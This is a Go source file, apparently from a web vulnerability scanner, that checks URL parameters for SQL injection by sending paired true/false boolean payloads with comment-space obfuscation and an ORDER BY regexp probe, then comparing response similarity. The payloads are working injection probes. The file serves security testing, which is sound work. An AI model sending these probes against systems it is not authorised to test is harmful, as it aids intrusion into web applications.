package sqlmap

import (
	"fmt"
	"github.com/antlabs/strsim"
	"github.com/yhy0/Jie/logging"
	JieOutput "github.com/yhy0/Jie/pkg/output"
	"github.com/yhy0/Jie/pkg/protocols/httpx"
	"github.com/yhy0/Jie/pkg/util"
	"regexp"
	"strings"
	"time"
)

/**
  @author: yhy
  @since: 2023/2/8
  @desc: 检查闭合类型
**/

// 进行闭合检测
func (sql *Sqlmap) checkCloseType(pos int) (int, bool) {
	// 匹配参数的值为整形的情况
	regex := regexp.MustCompile(`^[0-9]+$`)

	for i, p := range sql.Variations.Params {
		if i == pos {
			numeric := regex.MatchString(p.Value)

			closeType := sql.checkParam(p, numeric)
			if closeType == -1 {
				sql.Variations.SetPayloadByindex(p.Index, sql.Url, p.Value+"\n", sql.Method)
				closeType = sql.checkParam(p, numeric)
				if closeType == -1 {
					return -1, false //进行下一个参数的检测
					//进行下一个参数的检测
				} else {
					return closeType, true
				}

			} else {
				return closeType, false
			}

		}

	}
	return -1, false

}

// checkParam 对参数进行检测闭合的类型
func (sql *Sqlmap) checkParam(param httpx.Param, isNumeric bool) int {
	var positivePayload, negativePayload, paramType string

	if isNumeric {
		paramType = "数字"
		rand1 := util.RandNumber(1, 20000)
		positivePayload = fmt.Sprintf("%v{{type}}/**/AND/**/{{type}}%v{{type}}={{type}}%v", param.Value, rand1, rand1)
		negativePayload = fmt.Sprintf("%v{{type}}/**/AND/**/{{type}}%v{{type}}={{type}}%v", param.Value, rand1, rand1+1)
	} else {
		paramType = "字符串"
		randString := util.RandLetters(4)
		positivePayload = fmt.Sprintf("%v{{type}}/**/AND/**/{{type}}%v{{type}}={{type}}%v", param.Value, randString, randString)
		negativePayload = fmt.Sprintf("%v{{type}}/**/AND/**/{{type}}%v{{type}}={{type}}%v", param.Value, randString, util.RandLetters(5))
	}

	for k, v := range CloseType {
		positivePayload = strings.ReplaceAll(positivePayload, "{{type}}", v)
		res := sql.checkType(param, positivePayload, negativePayload, paramType, v+"闭合")
		if res {
			return k
		}

		time.Sleep(0.5)
	}

	if isNumeric {
		paramType = "数字"
		positivePayload = "(select/**/1/**/regexp/**/if(1=1,1,0x00))"
		negativePayload = "(select/**/1/**/regexp/**/if(1=2,1,0x00))"
	} else {
		paramType = "字符串"
		positivePayload = "(select/**/1/**/regexp/**/if(1=1,1,0x00))"
		negativePayload = "(select/**/1/**/regexp/**/if(1=2,1,0x00))"
	}

	res := sql.checkType(param, positivePayload, negativePayload, paramType, "order by无闭合")
	if res {
		logging.Logger.Debugf("检测到ORDER BY")
	}
	return -1
}

func (sql *Sqlmap) checkType(param httpx.Param, positivePayload, negativePayload, paramType, closeType string) bool {

	payload := sql.Variations.SetPayloadByindex(param.Index, sql.Url, positivePayload, sql.Method)

	p1rsp, err := httpx.Request(sql.Url, sql.Method, payload, false, sql.Headers)

	if err != nil {
		logging.Logger.Debugf("request positive rsp error: %s", err)
		return false
	}

	payload = sql.Variations.SetPayloadByindex(param.Index, sql.Url, negativePayload, sql.Method)

	n1rsp, err := httpx.Request(sql.Url, sql.Method, payload, false, sql.Headers)
	if err != nil {
		logging.Logger.Debugf("request positive rsp error: %s", err)
		return false
	}

	if sql.OriginalBody == "" || p1rsp.ResponseDump == "" {
		logging.Logger.Debugln("response empty")
		return false
	}

	opResult := strsim.Compare(sql.OriginalBody, p1rsp.Body)
	if opResult < SimilarityRatio {
		logging.Logger.Debugf("参数为%v，假定[%v]边界，[%v]与原参数结果不相同", paramType, closeType, positivePayload)
		return false
	}

	pnResult := strsim.Compare(p1rsp.Body, n1rsp.Body)

	if pnResult > SimilarityRatio {
		logging.Logger.Debugf("参数为%v，注入检查失败：原因：[%v] 与 [%v] 结果类似/相同: 相似度为：%v",
			paramType,
			positivePayload,
			negativePayload,
			pnResult)
		return false
	}

	JieOutput.OutChannel <- JieOutput.VulMessage{
		DataType: "web_vul",
		Plugin:   "SQL Injection",
		VulData: JieOutput.VulData{
			CreateTime:  time.Now().Format("2006-01-02 15:04:05"),
			Target:      sql.Url,
			Ip:          "",
			Request:     p1rsp.RequestDump,
			Response:    p1rsp.ResponseDump,
			Payload:     payload,
			Description: fmt.Sprintf("疑似SQL注入：【参数：%v型[%v=%v] [%v]】", paramType, param.Name, param.Value, closeType),
		},
		Level: JieOutput.Critical,
	}

	return true
}
